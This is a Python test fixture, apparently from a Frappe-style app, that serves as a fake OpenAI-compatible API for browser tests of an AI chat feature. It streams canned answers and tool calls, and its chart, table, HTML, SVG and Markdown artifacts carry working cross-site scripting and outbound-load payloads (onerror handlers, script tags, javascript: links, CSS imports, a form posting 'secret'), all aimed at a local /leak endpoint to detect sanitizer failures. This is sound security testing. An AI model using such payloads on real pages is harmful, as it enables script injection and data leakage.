# Copyright (c) 2026, Blaze Technology Solutions and contributors
# For license information, please see license.txt

"""A stand-in for an OpenAI-compatible API, so the browser tests drive AI Chat without keys.

Streams Chat Completions as SSE. What it does follows the last message:
- a tool result            -> a short answer quoting it
- "artifact <kind>"        -> calls create_artifact with hostile content of that kind
- "check number"           -> calls get_check_number (Run Live Check)
- "change todo <name> to X" -> calls update_document on that ToDo
- "bulk todos <a,b,c> to X" -> calls bulk_update_documents on those ToDos
- "how many todo"          -> calls count_documents(doctype="ToDo")
- anything else            -> a streamed Markdown answer with a table

Every outside address in the hostile content points back here under /leak, so anything an
artifact manages to load shows up as a GET in the log (E2E_FAKE_LOG, if set) and at /requests.
/bodies returns every chat request received, to check what reached the model.
Port: E2E_FAKE_PORT, default 18080.
"""

import json
import os
import re
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

PORT = int(os.environ.get("E2E_FAKE_PORT") or 18080)
LOG = os.environ.get("E2E_FAKE_LOG")
SEEN: list[str] = []  # every path asked for, served at /requests
BODIES: list[dict] = []  # every chat request, served at /bodies


def chunk(model, delta=None, finish=None, usage=None):
	body = {
		"id": "chatcmpl-e2e",
		"object": "chat.completion.chunk",
		"created": int(time.time()),
		"model": model,
	}
	body["choices"] = [] if usage else [{"index": 0, "delta": delta or {}, "finish_reason": finish}]
	if usage:
		body["usage"] = usage
	return f"data: {json.dumps(body)}\n\n".encode()


# Every outside address points back here, so a page that leaks shows up as a GET in the log.
LEAK = f"http://127.0.0.1:{PORT}/leak"
EVIL = '<img src=x onerror="window.__pwned=(window.__pwned||0)+1">'

CHART = {
	"type": "bar",
	"title": "Sales " + EVIL,
	"labels": ["Jan", "Feb " + EVIL, "Mar"],
	"datasets": [
		{"name": "Sales <b onmouseover=window.__pwned=1>x</b>", "values": [120, 95, 140]},
		{"name": "Target", "values": [100, 100, 100], "chartType": "line"},
	],
	"colors": ["#2563eb", "red;background:url(" + LEAK + "/color)"],
}
CHART_V2 = dict(CHART, title="Sales, revised", labels=["Jan", "Feb", "Mar"])
CHART_V2["datasets"] = [{"name": "Sales", "values": [130, 99, 150]}]

TABLE = {
	"title": "Stock " + EVIL,
	"columns": ["Item", {"label": "Qty", "type": "number"}, "Note"],
	"rows": [["Widget", 4, EVIL], ["Gear", 19, "fine"], ["Bolt", 2, "low"]],
}

ARTIFACTS = {
	"chart": {"title": "Monthly sales", "type": "chart", "content": json.dumps(CHART), "key": "sales"},
	"v2": {"title": "Monthly sales", "type": "chart", "content": json.dumps(CHART_V2), "key": "sales"},
	"table": {"title": "Stock levels", "type": "table", "content": json.dumps(TABLE)},
	"dashboard": {
		"title": "Ops dashboard",
		"type": "dashboard",
		"content": json.dumps(
			{
				"title": "Operations",
				"tiles": [
					{"label": "Open orders", "value": "42", "note": "this week"},
					{"label": "Late " + EVIL, "value": "3"},
				],
				"charts": [dict(CHART, type="donut", datasets=[{"name": "Sales", "values": [1, 2, 3]}])],
				"tables": [TABLE],
			}
		),
	},
	"document": {
		"title": "Meeting notes",
		"type": "document",
		"content": "# Notes\n\n- **Agreed**: ship Friday\n- [click](javascript:window.__pwned=1)\n\n"
		+ EVIL
		+ "\n\n<script>window.__pwned=1</script>\n\n![outside]("
		+ LEAK
		+ "/md.png)\n\n| A | B |\n|---|---|\n| 1 | 2 |",
	},
	"html": {
		"title": "Letter",
		"type": "html",
		"content": (
			'<meta http-equiv="refresh" content="0;url=' + LEAK + '/meta">'
			"<style>@import url("
			+ LEAK
			+ "/import.css); h1{color:#2563eb} body{background:url("
			+ LEAK
			+ "/bg.png)}</style>"
			"<h1>Dear customer</h1><p>Thank you for your order.</p>"
			+ EVIL
			+ "<script>window.parent.__pwned=1; fetch('"
			+ LEAK
			+ "/script')</script>"
			'<img src="' + LEAK + '/img.png">'
			'<form action="' + LEAK + '/form"><input name="q" value="secret"><button>Send</button></form>'
			'<a href="javascript:window.parent.__pwned=1">link</a>'
			'<iframe src="' + LEAK + '/frame"></iframe>'
			'<div style="background-image:url(' + LEAK + '/inline.png)">Styled</div>'
			"<table><tr><th>Item</th><th>Qty</th></tr><tr><td>Widget</td><td>4</td></tr></table>"
		),
	},
	"svg": {
		"title": "Flow",
		"type": "svg",
		"content": (
			'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" '
			'width="300" height="120" onload="window.__pwned=1">'
			"<script>window.__pwned=1</script>"
			'<rect x="10" y="10" width="120" height="60" fill="#dbeafe" stroke="#2563eb"/>'
			'<text x="20" y="45">Order</text>'
			'<image href="' + LEAK + '/svg.png" x="150" y="10" width="50" height="50"/>'
			'<a xlink:href="javascript:window.__pwned=1"><text x="150" y="90">Link</text></a>'
			"</svg>"
		),
	},
	"code": {
		"title": "Report script",
		"type": "code",
		"language": "python",
		"content": "def total(rows):\n\treturn sum(r['qty'] for r in rows)  # <script>alert(1)</script>\n",
	},
}


def record(entry: dict) -> None:
	SEEN.append(entry["path"])
	if LOG:
		with open(LOG, "a") as log:
			log.write(json.dumps(entry) + "\n")


class Handler(BaseHTTPRequestHandler):
	def log_message(self, *args):
		pass

	def do_GET(self):
		if self.path == "/requests":
			return self.reply_json(SEEN)
		if self.path == "/bodies":
			return self.reply_json(BODIES)
		record({"path": self.path, "method": "GET"})
		if self.path.rstrip("/").endswith("/models"):
			self.reply_json({"object": "list", "data": [{"id": "e2e-fake-model", "object": "model"}]})
		else:
			self.reply_json({"error": "not found"}, 404)

	def do_POST(self):
		length = int(self.headers.get("Content-Length") or 0)
		request = json.loads(self.rfile.read(length) or b"{}")
		record({"path": self.path, "method": "POST", "body": request})
		BODIES.append(request)

		model = request.get("model", "e2e")
		messages = request.get("messages", [])
		tools = {tool["function"]["name"] for tool in request.get("tools", [])}
		last = messages[-1] if messages else {}
		text = (
			last.get("content") if isinstance(last.get("content"), str) else json.dumps(last.get("content"))
		)

		self.send_response(200)
		self.send_header("Content-Type", "text/event-stream")
		self.send_header("Cache-Control", "no-cache")
		self.end_headers()

		prompt_tokens = len(json.dumps(request)) // 4
		change = re.search(r"change todo (\S+) to (.+)", text or "", re.I)

		if last.get("role") == "tool":
			self.stream_text(model, f"Here is what I found:\n\n> {last['content'][:300]}", prompt_tokens)
		elif change and "update_document" in tools:
			args = {"doctype": "ToDo", "name": change.group(1), "values": {"description": change.group(2)}}
			self.stream_call(model, "update_document", args, prompt_tokens)
		elif (wanted := re.search(r"artifact (\w+)", text or "", re.I)) and "create_artifact" in tools:
			self.stream_call(model, "create_artifact", ARTIFACTS[wanted.group(1).lower()], prompt_tokens)
		elif re.search(r"check number", text or "", re.I) and "get_check_number" in tools:
			self.stream_call(model, "get_check_number", {}, prompt_tokens)
		elif (
			bulk := re.search(r"bulk todos (\S+) to (.+)", text or "", re.I)
		) and "bulk_update_documents" in tools:
			args = {
				"doctype": "ToDo",
				"filters": {"name": ["in", bulk.group(1).split(",")]},
				"values": {"description": bulk.group(2)},
			}
			self.stream_call(model, "bulk_update_documents", args, prompt_tokens)
		elif re.search(r"how many todo", text or "", re.I) and "count_documents" in tools:
			self.stream_call(model, "count_documents", {"doctype": "ToDo"}, prompt_tokens)
		else:
			answer = (
				"Sure. Here is a **quick summary**:\n\n| Item | Qty |\n|---|---|\n| Widgets | 4 |\n| Gears | 9 |\n\n"
				f"You said: _{(text or '')[:80]}_"
			)
			self.stream_text(model, answer, prompt_tokens)

		self.wfile.write(b"data: [DONE]\n\n")
		self.wfile.flush()

	def stream_text(self, model, text, prompt_tokens):
		self.wfile.write(chunk(model, {"role": "assistant", "content": ""}))
		for word in re.split(r"(\s+)", text):
			if word:
				self.wfile.write(chunk(model, {"content": word}))
				self.wfile.flush()
				time.sleep(0.03)
		self.wfile.write(chunk(model, finish="stop"))
		self.wfile.write(
			chunk(
				model,
				usage={
					"prompt_tokens": prompt_tokens,
					"completion_tokens": len(text) // 4,
					"total_tokens": 0,
				},
			)
		)

	def stream_call(self, model, name, args, prompt_tokens):
		call = {
			"index": 0,
			"id": f"call_{int(time.time() * 1000)}",
			"type": "function",
			"function": {"name": name, "arguments": ""},
		}
		self.wfile.write(chunk(model, {"role": "assistant", "tool_calls": [call]}))
		encoded = json.dumps(args)
		for start in range(0, len(encoded), 12):
			self.wfile.write(
				chunk(
					model,
					{"tool_calls": [{"index": 0, "function": {"arguments": encoded[start : start + 12]}}]},
				)
			)
		self.wfile.write(chunk(model, finish="tool_calls"))
		self.wfile.write(
			chunk(model, usage={"prompt_tokens": prompt_tokens, "completion_tokens": 40, "total_tokens": 0})
		)

	def reply_json(self, body, status=200):
		data = json.dumps(body).encode()
		self.send_response(status)
		self.send_header("Content-Type", "application/json")
		self.send_header("Content-Length", str(len(data)))
		self.end_headers()
		self.wfile.write(data)


if __name__ == "__main__":
	ThreadingHTTPServer(("127.0.0.1", PORT), Handler).serve_forever()
